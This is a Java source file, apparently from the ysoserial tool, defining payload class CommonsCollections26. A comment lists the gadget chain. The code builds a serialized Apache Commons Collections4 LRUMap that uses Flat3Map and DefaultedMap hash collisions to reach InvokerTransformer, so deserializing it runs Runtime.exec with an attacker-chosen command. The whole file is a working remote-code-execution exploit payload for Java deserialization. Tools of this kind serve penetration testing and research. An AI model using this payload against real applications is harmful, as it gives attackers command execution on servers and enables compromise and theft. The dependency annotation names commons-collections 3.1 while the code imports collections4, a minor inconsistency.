package ysoserial.payloads;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.DefaultedMap;
import org.apache.commons.collections4.map.LRUMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
    Cluster3_20222104-204053.txt, first chain.
	Gadget chain:

        chain_LRUMap4-readObject-4ca452f14096da67b70943970bb52b31e127d0aa.txt
            [
         <org.apache.commons.collections4.map.LRUMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.LRUMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections4.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.functors.ConstantTransformer: boolean equals(java.lang.Object)>
         <java.util.Hashtable: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.map.DefaultedMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections:3.1"})
@Authors({ "BadagliaccaDaniele" })
public class CommonsCollections26 extends PayloadRunner implements ObjectPayload<LRUMap> {

    public LRUMap getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};


        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two DefaultedMap with colliding hashes, in order to force element comparison during readObject
        Map defaultedMap1 = DefaultedMap.defaultedMap(innerMap1, (Object) transformerChain);
        defaultedMap1.put("yy", 1);

        Map defaultedMap2 = DefaultedMap.defaultedMap(innerMap2, (Object) transformerChain);
        defaultedMap2.put("zZ", 1);

        Hashtable hashtable1 = new Hashtable();
        hashtable1.put(defaultedMap1, 1);
        Hashtable hashtable2 = new Hashtable();
        hashtable2.put(defaultedMap2, 1);

        ConstantTransformer constantTransformer1 = new ConstantTransformer(hashtable1);
        ConstantTransformer constantTransformer2 = new ConstantTransformer(hashtable2);

        Flat3Map flat3map1 = new Flat3Map();
        flat3map1.put("yy", constantTransformer1);
        Flat3Map flat3map2 = new Flat3Map();
        //flat3map1.put(constantTransformer2, 1);
        flat3map2.put("yy", constantTransformer2);

        LRUMap lruMap = new LRUMap();
        lruMap.put(flat3map1, 1);
        lruMap.put(flat3map2, 2);


        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        defaultedMap2.remove("yy");

        return lruMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections26.class, args);
    }

}
